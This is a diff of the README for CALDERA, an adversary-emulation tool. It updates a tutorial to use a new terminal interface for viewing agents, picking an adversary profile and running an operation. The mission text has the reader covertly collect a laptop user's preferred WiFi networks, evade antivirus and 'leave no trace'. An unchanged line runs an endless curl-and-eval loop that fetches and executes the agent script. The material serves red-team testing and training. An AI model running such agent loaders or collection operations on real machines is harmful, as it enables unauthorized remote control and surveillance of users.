@@ -25,8 +25,9 @@ python server.py
 ```
 
 Once running, you can log in to the system through the web interface at https://localhost:8888, using the default creds of admin:admin. 
-Alternatively, you can open a terminal into CALDERA and enter help to see the options:
+Alternatively, you can open a new terminal into CALDERA and enter help to see the options:
 ```
+python app/terminal/terminal.py
 caldera> help
 ```
 
@@ -88,9 +89,10 @@ along with to understand the system. These missions will assume CALDERA is runni
 > Perform reconnaissance on a compromised OSX laptop. Your employer needs a list of the user’s preferred WIFI networks to perform surveillance on them. Grab this list and collect anything else you can, then get out of town. Quickly. Leave no trace. There is one caveat: the laptop’s AV scans the machine in full every minute. 
 You must complete this mission in less than 60 seconds. 
 
-Start by booting up the core system on your OSX laptop.
+Start by booting up the core system and the terminal view on your OSX laptop.
 ```
-python server.py -E local
+python server.py
+python app/terminal/terminal.py
 ```
 
 Then start a 54ndc47 agent on the same machine.
@@ -98,36 +100,39 @@ Then start a 54ndc47 agent on the same machine.
 while true; do eval "$(curl -sk -X POST -H "file:54ndc47.sh" https://localhost:8888/file/render?group=client)"; sleep 60; done
 ```
 
-Then, in a new terminal window, open a shell to the core system. Type help to see all options. Then,
-view the connected agent and the group that was created with the appropriate keystrokes.
+In the terminal window, type help to see all options. Then view the connected agent with the appropriate keystrokes.
 ```
-nc localhost 8880
-monitor >>> help
-monitor >>> ag
-monitor >>> gr
+caldera> help
+caldera> agent
+caldera (agent)> view
 ```
 
 Next, look at the loaded adversaries, and dive deeper into the mission1 adversary.
 ```
-monitor >>> ad
-monitor >>> ad 1
+caldera (agent)> adversary
+caldera (adversary)> view
+caldera (adversary)> pick 1
 ```
 
-Then queue up a new operation, passing in an operation name (test1), adversary ID (1), group ID (1),
+Switch to operation mode and set the following arguments: name (test1), adversary (1), group (1),
 and jitter fraction. The fraction determines how often each agent will check in with CALDERA. The 
 fraction below (3/5) means the check-in will happen between every 3 to 5 seconds. Finally, start your operation and 
 confirm it is in progress by viewing all operations. The operation will have completed when a finish
 timestamp is visible.
 ```
-monitor >>> qu test1 1 1 3/5
-monitor >>> st 1
-monitor >>> op
+caldera (adversary)> operation
+caldera (operation)> set name test1
+caldera (operation)> set adversary 1
+caldera (operation)> set group 1
+caldera (operation)> set jitter 3/5
+caldera (operation)> run
 ``` 
 
 It will take up to 60 seconds for the agent to join the operation, at which point it will check in 
 according to the jitter time chosen. Every few seconds, check the progress of the operation.
 ```
-monitor >>> op 1
+caldera (operation)> view
+caldera (operation)> pick 1
 ```
 
 Once the operation is complete, compare the execution time of the first and last commands. Was
